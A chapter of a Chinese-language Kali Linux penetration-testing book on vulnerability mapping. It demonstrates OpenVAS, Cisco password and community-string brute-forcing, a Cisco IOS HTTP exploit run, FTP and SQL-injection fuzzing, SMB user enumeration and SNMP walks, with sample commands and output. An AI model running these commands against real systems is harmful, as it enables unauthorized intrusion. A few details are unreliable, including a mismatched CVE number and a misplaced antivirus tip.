##

```
第7章 漏洞映射
漏洞映射旨在識別和分析目標環境中的決定性安全缺陷，有時也稱為脆弱性評估。它是一種在IT基礎設施的安全控制中探尋已知弱點的分析方法，是脆弱性管理計畫的一個關鍵組成部分。測試人員在完成了資訊收集、目標識別和服務枚舉的相關工作後，就可著手分析目標設施中可能存在的安全性漏洞。安全性漏洞可能導致目標系統發生安全事故，有害於業務系統的保密性、完整性和可用性。

本章將要討論安全性漏洞的兩種常見類型，闡述安全性漏洞的各種分類標準，還會介紹Kali Linux系統提供的幾款著名的脆弱性分析工具。這部分章節涵蓋以下幾個主題。

● 漏洞的兩種常見類型：本地漏洞和遠端漏洞。

● 漏洞分類的行業標準和分類的依據。

● 幾款有助於査找並分析目標環境中存在的安全缺陷的安全工具。本章依據這些工具在安仝評估中的主要功能對它們進行了分類，把它們分為 OpenVAS 工具、Cisco 分析工具、模糊分析工具、SMB分析工具、SNMP分析工具和Web應用程式分析工具。

值得注意的是，在進行滲透測試（包括內部和外部）時，人工評估和自動化脆弱性分析都很等重要。完全依賴自動化測試工具獲得的評估結果，可能會有假陽性（誤報）和假陰性（漏報）的情況。同時，審計人員對技術評估工具的熟悉程度同樣影響著滲透測試工作的品質。要保障滲透工作的長期品質，要在注重評估工具品質的同時，不斷提高審計人員的技能水準。本質上說，自動化工具生成的脆弱性分析結果不可能是最終的評估結果；自動化工具不能識別邏輯錯誤、未發現的漏洞、未公佈的軟體缺陷，以及影響安全的人類因素。因此，應當同時結合自動化分析和人工分析的方法，綜合評估安全性漏洞，這將大幅度提升滲透測試工作的成功概率。

7.1 漏洞的類型
按照產生缺陷的不同階段，漏洞可劃分為以下三個大類：設計類、實施類和運營類。

● 設計類漏洞：在軟體設計階段，因軟體規格指標設計不當而產生的安全弱點。

● 實施類漏洞：位於系統代碼中的技術安全缺陷。

● 運營類漏洞：由於系統的配置或部署不當而導致的安全性漏洞。

基於對這三個類別的分析，我們總結出了漏洞的兩個通用類型，即本地漏洞和遠端漏洞。上述三類類漏洞既可以是本地漏洞，也可以是遠端漏洞。

在上述三類漏洞之中，哪種漏洞問題最難解決？

開發人員根據安全性需求指定系統安全規格，並依此在實施過程中實現各種安全指標。因此，解決設計類漏洞的時間最長。

7.1.1 本地漏洞
攻擊人員以本地（物理）訪問方式，通過執行代碼的手段才能觸發的漏洞稱為“本地漏洞”。攻擊人員能夠利用這種類型的漏洞提高自身的存取權限，不受限制地訪問該電腦系統。

例如，Bob擁有訪問MS Windows Server 2008（32 位x86 平臺）伺服器的本地許可權。管理員通過某種安全性原則限制了他的存取權限，禁止他運行特定的應用程式。在極端條件下，他發現惡意程式碼可讓他獲取該電腦的系統級別或內核級別許可權。利用了著名的安全性漏洞（例如，CVE-2013-0232、GP Trap Handler nt!KiTrap0D）之後，他提升了自己的許可權等級，並能夠進行管理級別的操作，可不受限制地執行應用程式。這個範例表明，惡意的安全對手可通過本地漏洞輕易地提升他們訪問電腦系統的許可權。

有關微軟Windows許可權提升漏洞CVE-2013-0232的詳細資料，請參見http://www.exploit-db.com/exploits/11199/。

7.1.2 遠程漏洞
在物理上不接觸主機的情況下，攻擊人員使用惡意程式通過網路觸發的系統漏洞，稱作遠端漏洞。這種類型的漏洞可使得攻擊人員越過物理上的和本地上的限制，獲取遠端主機的存取權限。

例如，Bob和Alice分別聯入互聯網。他們的IP地址不同，分屬不同的國家。假設Alice的電腦運行的作業系統是Windows XP，使用了生物學認證技術。再假如Bob 事先知道Alice主機的作業系統和IP位址。Bob極力想獲取Alice電腦的遠程控制許可權。同時，他瞭解到可通過MS08-67 漏洞（Windows Server Service 的漏洞）遠端攻擊Windows XP 主機。

有關MS08-67，即微軟Windows Server Service漏洞的詳細資訊，請參見http://www.exploit-db.com/exploits/6841/。

他使用了有關exploit程式獲取了Alice主機的存取權限。

漏洞（vulnerability）和漏洞利用程式（exploit）的關係是什麼？

漏洞是系統上存在的安全弱點。共計人員可利用有關漏洞或bug獲取該主機的未經授權的操作許可權。

7.2 漏洞的分類
隨著近些年來技術領域的持續發展，人們也在不斷總結安全性漏洞的各種分類方法，期待以最合理的方式劃分所有的常見漏洞。但是，就常見的影響系統安全的程式設計問題來說，還沒有一種分類方法可以將之完全歸納。實際上，單一的漏洞可能分別屬於多個類別或類型，這是現今分類方法都解決不了的問題。另外，每種系統平臺都需要與外部環境進行交互，這又帶來分類方法的關聯性問題、複雜性問題和擴展性問題。如下列表格所示，本書列舉了多種分類標準，希望有助您識別各種安全故障。值得一提的是，很多調查軟體安全性問題的安全評估工具，已經採取了這些漏洞分類方法。

figure_0187_0090

上述各種分類方法，分別以各自的方式將安全性漏洞進行分類，以説明資訊安全有關人員和研發人員識別那些可能會影響系統安全性的特定錯誤。因此，這些分類方法並不具備學術上的完備性和精確性。

7.3 OpenVAS
OpenVAS是一款封裝了多種安全工具和安全服務的軟體，是一個強大的漏洞管理平臺。它採用了用戶端/伺服器的框架。其用戶端測試目標主機網路漏洞的一系列操作，都是通過伺服器端程式實現的。它的設計兼備模組化和穩定性的特點，支援並行安全測試，且相容多種作業系統（Linux/Win32）。OpenVAS的核心組件和主要功能如下。

● OpenVAS scanner（掃描器）：負責管理、執行各種網路漏洞測試（NVT，Network Vulnerability Test）。NVT的訂閱服務提供每日更新。整個平臺可通過訂閱服務更新測試外掛程式（參見http://www.openvas.org/nvt-feeds.html）。

● OpenVAS Client（用戶端）：即傳統形式的桌面客工具和命令列工具（CLI）。它通過OTP協定（OpenVAS Transfer Protocol）控制掃描器。OTP相當於OpenVAS scanner的前段通信協議。

● OpenVAS Manager（管理程式）：漏洞掃描平臺的中央控制服務。管理程式僅負責集中存儲設定檔和存儲掃描結果。此外，它的OMP 協議（OpenVAS Management Protocol）完全基於 XML，可用於各種用途。OMP 可用於設置掃描計畫、生成測試報告、篩選掃描結果和聚合活動。

● Greenbone Security Assistant（安全助手）：工作於OMP 的Web 服務。它用於向用戶提供一種基於OMP的Web用戶端，方便使用者配置、管理、控制具體的掃描操作。它的桌上出版用戶端程式叫做GSA Desktop，功能完全一樣。此外，OpenVAS CLI（命令列工具）還支援在文本命令列下運行OMP協定的指令。

● OpenVAS administrator：負責用戶管理和訂閱更新。

OpenVAS使用的工具

OpenVAS集成的工具清單如下。

figure_0188_0091

續表

figure_0189_0092

設置OpenVAS的關鍵步驟如下。

1. 在桌面功能表中依此選中 Kali Linux | Vulnerability Analysis | OpenVAS | Openvas check setup，並按照程式的嚮導進行操作，以確定本機已經正確安裝了 OpenVAS程式。然後按照提示，用預設的選項設置證書等專案；僅建議您在完全理解這些工具的情況下進行自訂設置。在您完成了每個FIX（修復）操作之後，您需要重新運行一次openvas check setup，直到它提示您已經成功配置好了這個程式。如圖7.1所示，您同樣可以在命令列視窗裡啟動這個程式。

2. 在桌面功能表中依此選中Kali Linux | Vulnerability Analysis | OpenVAS | Openvas check setup，創建一個OpenVAS 掃描所需的使用者帳號。在程式詢問Authentication（pass/cert）時直接用回車鍵跳過該設置。在創建帳號的最後一步，程式會要您為新建帳號創建規則。如果您不需要設置特定規則，可使用Ctrl+D鍵直接退出。如果您要進行相應設置，可通過下述指令查看有關設置的説明文件。

man openvas-adduser
3. 在主機聯入互聯網的情況下，通過NVT的訂閱服務更新OpenVAS的外掛程式，即在桌面菜單中依次選中Kali Linux |VulnerabilityAssessment | OpenVAS | OpenVas NVTSync。

4. 接下來就需要啟動 OpenVAS 的服務端程式，以使用戶端程式能夠進行操作。在桌面功能表中依次選中Kali Linux | Vulnerability Assessment | OpenVAS | OpenVas Server，並等待程式載入完畢。

figure_0190_0093

圖7.1

5. 最後，可啟動OpenVAS用戶端程式。在桌面功能表裡，桌面功能表中依次選中Kali Linux | Vulnerability Assessment | OpenVAS | OpenVas Client。在用戶端介面視窗出現之後，選擇File｜Connect連接到OpenVAS Server，然後輸入在第1步和第2步裡設置的帳號資訊。

如圖7.2 所示，在用戶端程式中輸入登錄資訊，以連接到OpenVAS Server。

接下來要設置的參數是目標主機、選擇合適的外掛程式、提供登錄所需的憑據，並指定必要的訪問規則（如第2步所述）。設置好全域設置之後，在功能表中選中File | Scan Assistant，並輸入4個主要步驟（任務、範圍、目標以及執行）的詳細佶息。在測試目標系統之前，系統將提示指定登錄憑證，隨後程式會進行測試工作。您選擇的評估標準，決定了漏洞評估的時間長度。在完成評估的以後，程式會顯示本次任務的評估報告（見圖7.3）。

本例中，掃描任務的名稱是CustomerUK。在程式視窗頂部的功能表裡，選擇Report | Export匯出掃描報告，此時可以選擇適合的報告格式（如NBE、XML、HTML、LaTex、TXT或PDF）。OpenVAS是一個功能強大的漏洞評估軟體，它不僅能夠在評估目標系統的決定性安全問題，而且還能生成內容全面的掃描報告。它的報告含有風險計量、漏洞細節、解決方案和相關網上資源等資訊。

figure_0191_0094

圖7.2

figure_0191_0095

圖7.3

7.4 Cisco分析工具
Cisco 公司是頂級網路設備商之一，目前大多公司和政府機構都採用了他們的設備。對於Cisco品牌的設備來說，它們比其他品牌的設備面臨著更多的著攻擊和威脅；而對於攻擊人員來說，發掘這個品牌設備上的漏洞也比挖掘其他品牌設備的漏洞更為困難。Cisco品牌的硬體有路由器、交換機、安全設備、無線產品，軟體產品如IOS、NX-OS、安全裝置管理員、CiscoWorks、統一通信管理器等。可以說，在廣受好評的技術產品中，有不少是Cisco 品牌的產品。在本節中，我們將演示Kali Linux 中提供的針對Cisco 產品的安全測試工具。

7.4.1 Cisco Auditing Tool
Cisco Auditing Tool 簡稱CAT，屬於小型的安全審計工具。它可檢測出Cisco 路由器上的常見漏洞，能夠發現注入預設密碼、預設SNMP字串和老版本IOS上存在的bug問題。

如需啟動CAT，可在功能表裡依次選中Kali Linux | Vulnerability Analysis | Cisco Tools |cisco–auditing-tool。啟動終端視窗之後，您將看到掃描目標主機可用的所有選項。如果您打算繼續使用終端視窗，可執行下述指令。

cd /usr/share/
CAT ––help
上述指令將顯示程式的全部選項、相關選項的使用說明和功能描述。它掃描Cisco設備的選項有以下幾個。

● -h：指定主機名稱（在掃描單個主機的時候使用該選項）。

● -w：指定字典檔（以猜測團體字串）。

● -a：指定密碼清單（以窮舉密碼）。

● -i：及［ioshist］（檢查該IOS 在歷史上出現過的bug）。

將這些選項群組合將使用，可以暴力破解方式探測Cisco設備的密碼、團體字串和可能會再現的舊有IOS bug。在破解密碼之前，要更新路徑/pentest/cisco/cisco-auditingtool/lists 下的密碼清單和社區字串，以提髙破解成功的概率。而後，我們可在 Kali Linux的終端之中，使用下述指令進行掃描。

CAT -h ww.xx.yy.zz -w lists/community -a lists/passwords -i
Cisco Auditing Tool - g0ne [null0]

Checking Host: ww.xx.yy.zz

Guessing passwords:

Invalid Password: diamond

Invalid Password: cmaker

Invalid Password: changeme

Invalid Password: cisco

Invalid Password: admin

Invalid Password: default

Invalid Password: Cisco

Invalid Password: ciscos

Invalid Password: cisco1

Invalid Password: router

Invalid Password: router1

Invalid Password: _Cisco

Invalid Password: blender

Password Found: pixadmin

...

Guessing Community Names:

Invalid Community Name: public

Invalid Community Name: private

Community Name Found: cisco

...

如需編輯密碼字典和團體字串字典，可在執行上述命令之前，在終端視窗中使用Vim 編輯器編輯字典檔。Vim編輯器的詳細介紹，可通過下述指令進行查看。

man vim
Cisco設備有16種不同的許可權級別，許可權級別的代碼從0（限制最嚴格的級別）到15（限制最少的級別）。在設置Cisco設備帳戶的時候，每個帳戶都應設置相應的許可權等級。如需更詳細的介紹，請參見http://www.cisco.com/en/US/docs/ios/12_2t/12_2t13/feature/guide/ftprienh.html。

7.4.2 Cisco Global Exploiter
Cisco Global Exploiter（CGE）是小型的Perl 腳本程式。它可測試Cisco 設備的14 種獨立的漏洞。請注意只有特定類型的Cisco設備才會存在這些漏洞，所以這個程式不能完全滿足Cisco安全評估的全部需要。篇幅所限，本書不會逐個講解每個漏洞的具體資訊。

如需啟動CGE，可在功能表裡依次選中Kali Linux | Vulnerability Analysis | Cisco Tools |cisco-global-exploiter，或在終端視窗中執行下述指令。

cd /usr/bin/
cge.pl
上述指令將顯示程式的使用說明，並會按照順序列出它能識別的14種漏洞。例如，在測試Cisco 878 集成服務路由器時，我們可以使用下述指令。

cge.pl 10.200.213.25 3
Vulnerability successful exploited with [http://10.200.213.25/level/17/exec/... ] ...

上述指令進行的是第3類測試——測試Cisco IOS HTTPAuth漏洞，而且程式成功地利用了某個漏洞。進行深入調查之後，您會發現其他類型的Cisco設備同樣存在這種漏洞，而且您可以使用相似的手段利用這些漏洞。利用漏洞的過程如圖7.4所示。

figure_0194_0096

圖7.4

有關這個漏洞的詳細資訊，請參見http://www.cisco.com/warp/public/707/cisco-sa-20010627-ios-http-level.shtml。

可見，這種基於 HTTP 的強行訪問漏洞可讓入侵人員執行路由器指令，而且並不驗證他們的身份。

7.5 Fuzz（模糊）分析工具
模糊分析是一種軟體測試技術。審計人員和開發人員採用模糊分析技術，測試意外資料、無效資料和隨機的資料登錄對應用程式的影響。人們關注應用程式在模糊測試中出現的異常狀態和崩潰問題。這種測試技術可深度揭露軟體所隱含的其他測試手段不可能挖掘出來的漏洞。它能發現的漏洞有緩衝區溢位、格式化字串、代碼注入、迷途指標、競爭條件、拒絕服務條件和許多其他類型的漏洞。

Kali Linux 帶有多種模糊測試工具。這些工具可以測試檔案格式、網路通訊協定、命令列輸入、環境變數和Web應用。不可信的資料登錄源都會輸入不安全的和不一致的資料。例如， Web 應用程式和互聯網使用者之間的信任邊界不可預知。既然如此，就應當對所有可能的資料登錄都進行嘗試（模糊測試），以驗證巳知和未知的漏洞。模糊分析是一種相對簡單有效的測試方法，可用於品質保證和安全測試。由於這個原因，它有時也被稱為健壯性測試（robustness testing）或否定測試（negative testing）。

模糊分析的關鍵步驟是什麼？

通常認為，模糊測試由6 個步驟組成。這些步驟分別是識別目標、識別輸入、生成模糊測試資料、執行模糊資料、監控輸出和鑒別問題的可利用性（是否是exploit）。有關細節，請參見Fuzzing：Brute Force Vulnerability Discovery的ppt文件。該文件可在下述網址下載：http://recon.cx/en/f/msutton-fuzzing.ppt。

7.5.1 BED
Bruteforce Exploit Detector（BED）是純文字協定的模糊測試工具，用於檢測軟體常見漏洞。它可以檢測出緩衝區溢位漏洞、格式化字串漏洞、整數溢出、DoS條件等漏洞。BED 程式可以根據指定的協定，自動發送含有問題字串的命令組合，以測試目標的處理方式。它目前支援的協定包括ftp、smtp、pop、http、irc、imap、pjl、lpd、finger、socks4和socks5。

如需啟動BED 程式，可在功能表中依次選中Kali Linux | Vulnerability Analysis | Fuzzing Tools | bed，或者在shell 中使用下述指令。

cd /usr/share/bed/
bed.pl
上述指令將顯示它的使用說明。如需查看某個協定的外掛程式的詳細說明，可使用下述指令。

bed –s FTP
該指令將介紹 FTP 外掛程式的參數。在進行測試之前，我們通過該指令瞭解到這個外掛程式需要-u用戶名和-v密碼這兩個參數。接下來，我們利用BED測試目標系統的FTP守護進程。

bed -s FTP -u ftpuser -v ftpuser -t 192.168.0.7 -p 21 -o 3
BED 0.5 by mjm( www.codito.de ) ＆ eric ( www.snake-basket.de)

Buffer overflow testing:
testing: 1　　USER XAXAX　...........

testing: 2　　USER ftpuserPASS XAXAX　...........

Formatstring testing:
testing: 1　　USER XAXAX　.......

testing: 2　　USER ftpuserPASS XAXAX　.......

Normal tests

Buffer overflow testing:

testing: 1　ACCT XAXAX　　...........

testing: 2　APPE XAXAX　　...........

testing: 3　ALLO XAXAX　　...........

testing: 4　CWD XAXAX　　...........

testing: 5　CEL XAXAX　　...........

testing: 6　DELE XAXAX　　...........

testing: 7　HELP XAXAX　　...........

testing: 8　MDTM XAXAX　　...........

testing: 9　MLST XAXAX　　...........

testing: 10　MODE XAXAX　　...........

testing: 11　MKD XAXAX　　...........

testing: 12　MKD XAXAXCWD XAXAX　...........

testing: 13　MKD XAXAXDELE XAXAX　...........

testing: 14　MKD XAXAXRMD XAXAX　.....connection

attempt failed: No route to host

上述資訊表明，FTP守護程式在第14項測試的時候中斷了連接。這可能是個潛在的緩衝區溢位問題。但是我們還需要調查特定測試模組，檢查測試指令（參考檔/pentest/fuzzers/bed/bedmod/ftp.pm），以進行進一步調查。將目的程式恢復到正常狀態再進行兩次重複試驗、增加BED的超時時間（-o），都是確認問題可重複出現的良好習慣。

7.5.2 JBroFuzz
JBroFuzz是對Web應用程式進行模糊測試的著名平臺。它可類比HTTP協定和HTTPS協定的Web請求。獲悉要測試的功能變數名稱和測試的URL部分之後，審計人員可以自己手工構造測試的請求，也可以使用程式預定義的payload資料庫，生成基於已知漏洞的惡意請求，再把這些請求發送到目標伺服器以進行模糊測試。JbroFuzz 的資料庫能夠説明審計人員進行XSS、SQL 注入、緩衝區溢位、格式字串錯誤等問題的自動化測試。而後，程式會記錄目標的相應回復，以供進一步檢査。基於執行測試的類型，審計人員應當手動調查伺服器的回應或結果，以便識別出任何可能存在的漏洞。

JBroFuzz的關鍵功能包括模糊管理、payload的分類處理、通過流覽器的代理伺服器嗅探 Web 請求和回復、枚舉網站目錄等。這些功能都是應用協議模糊測試不可或缺的組成部分。

如需啟動JBroFuzz程式，可在終端中使用下述指令。

cd /usr/share/zaproxy/lib/jbrofuzz/
java -jar JBroFuzz.jar
JBroFuzz 介面之中有大量的選項設置，這些選項都有詳細的描述和說明。如果您需要查看説明，可在功能表列中選擇Help | Topics，進入圖7.5 所示的介面。

接下來，我們通過下述步驟測試一個Web應用程式。

1. 設定目標域的URL為http://testasp.targetdomain.com。這是一個基於ASP的Web應用程式。為滿足測試需求的實際需要，我們還要在Request面板中將HTTP請求調整為如下所示。

figure_0198_0097

圖7.5

GET /showthread.asp?id=4 HTTP/1.0

Host: testasp.example.com

User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB;

rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10

Accept: text/html,application/xhtml+xml,application/

xml;q=0.9,/;q=0.8

Accept-Language: en-gb,en;q=0.5

Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7

2. 在構造測試請求資料之前，我們已經知道這台伺服器上存在一個 URL：http://testasp.example.com/showthread.asp?id=4。

3. 創建一個手工構造的測試請求，並選擇URL的一部分（id=4）進行SQL注入的測試。

4. 選中第一行裡的數字值4，然後點擊頂部功能表條裡的加號（+）按鈕。

5. 在新彈出的視窗裡，選擇SQL Injection分類，並設置模糊測試的名稱為SQL Injection，然後點擊Add Fuzzer按鈕。

6. 設置好模糊測試任務之後，主程序視窗的右側邊角的Added Payloads Table標籤裡，將會顯示這個測試任務。

如果您的操作完全遵循上述步驟，那麼您現在就可以對目標主機的Web應用程式進行SQL注入漏洞的模糊測試。

可通過功能表Panel｜Start或快速鍵Ctrl+Enter啟動測試任務。在程式處理測試請求的時候，您將在Request面板裡看到程式發送的請求。另外，如果要觀察每個HTTP/HTTPS的處理進度，可點擊On The Wire 標籤查看。在它完成模糊測試之後，可調查每個測試請求的回應結果。可在Output 視窗中使用滑鼠右鍵點擊特定的伺服器回應，然後選擇Open in Browser選項。目標對我們發送的測試請求返回了下述資訊，它很可能是SQL注入漏洞的現象。

HTTP/1.1 500 Internal Server Error Connection:close Date: Sat, 04

Sep 2013 21:59:06 GMT Server: Microsoft-IIS/6.0 X-Powered-By:

ASP.NET Content-Length: 302 Content-Type: text/html Set-Cookie: ASPS ESSIONIDQADTCRCB=KBLKHENAJBNNKIOKKAJJFCDI;

path=/ Cache-control: private

Microsoft SQL Native Client error '80040e14'

Unclosed quotation mark after the character string ''.

/showthread.asp, line 9

在Windows系統中安裝Metasploit時，應該禁用防毒軟體，因為有些安裝檔會被其檢測為潛在的病毒或威脅，從而阻塞安裝過程。有關這個程式的詳細資訊，請參見 http://wiki191.owasp.org/index.php/Category:OWASP_JbroFuzz。

7.6 SMB分析工具
Server Message Block（SMB）是應用層協議，通常用於檔和印表機共用服務。此外，它還可將網路中不同節點的串口服務和其他通信協定共用。SMB 又稱為 CIFS（Common Internet File System）。

SMB採用了單純的用戶端/伺服器的CS架構，而且相容Linux和Windows等多種平臺。NetBIOS（Network BasicInput Output System）是SMB 協定的組成部分，用於Windows系統的傳輸服務。NetBIOS 工作於 TCP/IP 協定（NBT），因此同一局域網內的每台電腦都可通過唯一的網路名稱和IP位址與另一台電腦進行通信。

此外，對於DEC/RPC服務程式實現的網路節點間IPC（跨進程通信）而言，其認證通道同樣使用SMB協定。也就是說，不同電腦、不同進程間都可通過SMB的認證通道進行資料交換。NetBIOS服務通常在不同的TCP埠和UDP埠（135、137、138、139、445）上提供不同的服務。因為SMB功能強大而防護能力脆弱，所以它是駭客的首要攻擊目標。人們曾經曝光了SMB協議的大量漏洞，這些漏洞都為入侵者敞開了方便之門。本節將介紹獲取SMB資訊的多個工具，它們可獲取主機名稱、運行服務、網域控制站、MAC位址、作業系統類型、當前登錄使用者、隱藏共用、時間資訊、使用者群組、當前會話、印表機、可用磁片等資訊。

如需瞭解SMB、NetBIOS和相關協定的詳細資訊，請參見http://timothydevans.me.uk/nbf2cifs/book1.html。

ImpacketSamrdump

Samrdump 是獲取主機敏感資訊的工具。它通過 DCE/RPC（Distributed Computing Environment/Remote Procedure Call）服務調用 SAM（安全帳戶管理器，Security Account Manager）的遠端介面，繼而獲取資訊。它可列舉同一局域網內的目標主機上的所有的系統共用、使用者帳戶和其他資訊。

如需啟動ImpacketSamrdump，可在shell中執行下述指令。

cd /usr/share/doc/python-impacket-doc/examples/samrdump.py
python samrdump.py
上述指令將顯示它的使用說明和必要的語法簡介。簡單的說，python samrdump.py user:[email protected] port/SMB這樣的指令就可對指定目標的指定埠（139或445）進行檢測。

python samrdump.py h4x:[email protected] 445/SMB
Retrieving endpoint list from 192.168.0.7

Trying protocol 445/SMB...

Found domain(s):

. CUSTDESK

. Builtin

Looking up users in domain CUSTDESK

Found user: Administrator, uid = 500

Found user: ASPNET, uid = 1005

Found user: Guest, uid = 501

Found user: h4x, uid = 1010

Found user: HelpAssistant, uid = 1000

Found user: IUSR_MODESK, uid = 1004

Found user: IWAM_MODESK, uid = 1009

Found user: MoDesktop, uid = 1003

Found user: SUPPORT_388945a0, uid = 1002

Administrator (500)/Enabled: true

...

上述指令列出了遠端主機上的全部用戶名。在Samrdump的指令之中，目標主機的用戶名和密碼並不是必選項；在指定用戶名和密碼時，該指令將能返回其他方式獲取不到的更多資訊。利用上述資訊，我們可檢查在共用檔中搜索敏感性資料，訪問其他用戶，進而揭示更有價值的資訊。

7.7 SNMP分析工具
SNMP（Simple Network Management Protocol）是一個運行於UDP 協議161 埠的應用層協定。SNMP 協定主要用於網路設備運行狀態的監控，以關注需要管理員干預的事件，及時瞭解諸如電源斷電、網路不可達等網路運行情況。採用了SNMP管理技術的網路結構，通常由網路設備、管理端和代理端組成。

管理端程式負責網路管理和狀態監控的管理任務。代理端是網路設備運行的軟體。可運行用戶端程式的網路設備包括支援SNMP協定路由器、交換機、集線器、網路攝像頭、橋接器，以及安裝用戶端程式的作業系統（Linux、Windows）主機。安裝了代理端程式的設備通過SNMP協定向管理端報告設備頻寬、正常執行時間、運行進程、網路介面、系統服務等資料資訊。SNMP 資訊通過多個變數分別描述了系統不同方面的配置情況。SNMP 資訊採用 MIB（Management Information Base）的層次結構方式組織消息中的各種變數，每個變數有確定的唯一物件識別碼（Object Identifier，OID）。SNMP 協議共有三個版本，即v1、v2和v3。

以安全角度看，vl和v2版本的方案均是通過團體字串實現安全防護。而v3在保密性、完整性和身份驗證方面的功能更好。本文介紹的工具主要針對基於vl和v2c的SNMP設備。

如需深入瞭解SNMP協議，請參見http://www. tech-faq.com/snmp.html。

SNMP Walk

SNMP Walk是一個功能強大的SNMP資訊採集工具。它可依據設備類型提取所有配置資料。這些資訊將對攻擊的後續工作非常有用。此外，SNMP Walk 可針對性地獲取單組MIB資料或特定OID值。

如需啟動SNMP Walk 程式，可在終端中使用下述指令。

snmpwalk
上述命令將顯示該程式的使用說明和選項說明。SNMP Walk 可以使用三種不同版本的SNMP協定（即vl、v2c和v3），這也是它的主要優勢所在。在遠端設備使用的SNMP協定不能向下相容時，這一優勢將發揮作用。本例將使用下述指令，在指令行中分別以v1和v2c版本的SNMP協定獲取遠端主機的資訊。

snmpwalk -v 2c -c public -O T -L f snmpwalk.txt 10.20.127.49
SNMPv2-MIB::sysDescr.0 = STRING: Hardware: x86 Family 15 Model 4

Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 5.2 (Build 3790 Multiprocessor Free)

SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.311.1.1.3.1.2

DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1471010940) 170 days, 6:08:29.40

SNMPv2-MIB::sysContact.0 = STRING:

SNMPv2-MIB::sysName.0 = STRING: CVMBC-UNITY

SNMPv2-MIB::sysLocation.0 = STRING:

SNMPv2-MIB::sysServices.0 = INTEGER: 76

IF-MIB::ifNumber.0 = INTEGER: 4

IF-MIB::ifIndex.1 = INTEGER: 1

IF-MIB::ifIndex.65538 = INTEGER: 65538

IF-MIB::ifIndex.65539 = INTEGER: 65539

IF-MIB::ifIndex.65540 = INTEGER: 65540

IF-MIB::ifDescr.1 = STRING: Internal loopback interface for 127.0.0 network

IF-MIB::ifDescr.65538 = STRING: Internal RAS Server interface for dial in clients

IF-MIB::ifDescr.65539 = STRING: HP NC7782 Gigabit Server Adapter #2

IF-MIB::ifDescr.65540 = STRING: HP NC7782 Gigabit Server Adapter

IF-MIB::ifType.1 = INTEGER: softwareLoopback(24)

IF-MIB::ifType.65538 = INTEGER: ppp(23)

IF-MIB::ifType.65539 = INTEGER: ethernetCsmacd(6)

IF-MIB::ifType.65540 = INTEGER: ethernetCsmacd(6)

IF-MIB::ifMtu.1 = INTEGER: 32768

IF-MIB::ifMtu.65538 = INTEGER: 0

IF-MIB::ifMtu.65539 = INTEGER: 1500

...

IF-MIB::ifPhysAddress.65539 = STRING: 0:13:21:c8:69:b2

IF-MIB::ifPhysAddress.65540 = STRING: 0:13:21:c8:69:b3

IF-MIB::ifAdminStatus.1 = INTEGER: up(1)

...

IP-MIB::ipAdEntAddr.127.0.0.1 = IpAddress: 127.0.0.1

IP-MIB::ipAdEntAddr.192.168.1.3 = IpAddress: 192.168.1.3

IP-MIB::ipAdEntAddr.192.168.1.100 = IpAddress: 192.168.1.100

IP-MIB::ipAdEntAddr.10.20.127.52 = IpAddress: 10.20.127.52

IP-MIB::ipAdEntIfIndex.127.0.0.1 = INTEGER: 1

IP-MIB::ipAdEntIfIndex.192.168.1.3 = INTEGER: 65540

IP-MIB::ipAdEntIfIndex.192.168.1.100 = INTEGER: 65538

IP-MIB::ipAdEntIfIndex.10.20.127.52 = INTEGER: 65539

IP-MIB::ipAdEntNetMask.127.0.0.1 = IpAddress: 255.0.0.0

IP-MIB::ipAdEntNetMask.192.168.1.3 = IpAddress: 255.255.255.0

IP-MIB::ipAdEntNetMask.192.168.1.100 = IpAddress: 255.255.255.255

IP-MIB::ipAdEntNetMask.10.20.127.52 = IpAddress: 255.255.255.248

IP-MIB::ipAdEntBcastAddr.127.0.0.1 = INTEGER: 1

IP-MIB::ipAdEntBcastAddr.192.168.1.3 = INTEGER: 1

IP-MIB::ipAdEntBcastAddr.192.168.1.100 = INTEGER: 1

IP-MIB::ipAdEntBcastAddr.10.20.127.52 = INTEGER: 1

IP-MIB::ipAdEntReasmMaxSize.127.0.0.1 = INTEGER: 65535

IP-MIB::ipAdEntReasmMaxSize.192.168.1.3 = INTEGER: 65535

IP-MIB::ipAdEntReasmMaxSize.192.168.1.100 = INTEGER: 65535

IP-MIB::ipAdEntReasmMaxSize.10.20.127.52 = INTEGER: 65535

RFC1213-MIB::ipRouteDest.0.0.0.0 = IpAddress: 0.0.0.0

RFC1213-MIB::ipRouteDest.127.0.0.0 = IpAddress: 127.0.0.0

RFC1213-MIB::ipRouteDest.127.0.0.1 = IpAddress: 127.0.0.1

RFC1213-MIB::ipRouteDest.192.168.1.0 = IpAddress: 192.168.1.0

RFC1213-MIB::ipRouteDest.192.168.1.3 = IpAddress: 192.168.1.3

RFC1213-MIB::ipRouteDest.192.168.1.100 = IpAddress: 192.168.1.100

RFC1213-MIB::ipRouteDest.192.168.1.255 = IpAddress: 192.168.1.255

RFC1213-MIB::ipRouteDest.10.20.127.48 = IpAddress: 10.20.127.48

RFC1213-MIB::ipRouteDest.10.20.127.52 = IpAddress: 10.20.127.52

RFC1213-MIB::ipRouteDest.10.20.127.255 = IpAddress: 10.20.127.255

...

上述指令的輸出資訊可説明我們深入地瞭解目標主機。其中，選項-c 用於指定提取MIB 所需的團體字串，-O 選項將輸出結果以可讀的文本（T）形式進行輸出，-L選項將資料保存為檔（f snmpwalk.txt）。如需詳細瞭解SNMP Walk 各種使用方法，可訪問網址http://net-snmp.sourceforge.net/wiki/index.php/TUT:snmpwalk。滲透測試人員獲取的信息量越多，他們對目標網路架構理解得越透徹。

7.8 Web程式分析工具
現在的應用程式大多採用了多種Web技術，這不僅增加了程式問題的複雜性，而且增加了敏感性資料洩露的風險。一直以來，Web 應用程式從始至終都是惡意對手竊取、操縱、破壞和敲詐企業業務的目標。Web 應用程式的大量普及，也給滲透測試人員帶來了前所未有的巨大挑戰。Web 應用程式（前端）和資料庫（後端）都是加固網路安全的重點。Web應用程式扮演著資料處理系統的角色，而資料庫負責存儲敏感性資料（例如信用卡號、使用者資訊、認證資料等），所以兩者的安全性都要兼顧。

本節把Web應用程式的安全分析分為“Web應用程式測試”和“資料庫測試”兩個部分。雖然如此，我們應該非常清楚二者之間的關係，以及它們組成的複合技術架構。Kali Linux 提供了多款能夠對 Web 應用程式和資料庫程式進行綜合評估分析的安全評估工具。也就是說，有些工具能夠通過Web應用程式（即前端）攻擊後臺資料庫（如SQL注入）。

7.8.1 資料庫評估工具
